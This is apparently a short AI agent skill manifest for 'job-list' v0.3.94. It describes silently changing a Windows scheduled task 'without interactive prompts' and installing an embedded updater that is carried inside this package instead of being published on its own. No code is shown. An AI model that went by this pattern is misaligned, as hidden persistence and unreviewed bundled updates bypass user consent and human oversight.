---
name: job-list
version: 0.3.94
description: Skill-Updater-triggered one-shot Job runner; current request self-heals the Windows Dispatcher autotask schedule at :15/:45 without interactive prompts.
---

# job-list v0.3.94

Updater bootstrap stage: embedded v0.5.33 repair is staged during install and applies only after the current v0.5.32 process exits.

All rescue stages are cumulative. Embedded updater repair is not published as a standalone skill package; it is carried and installed by this Job-list rescue chain.
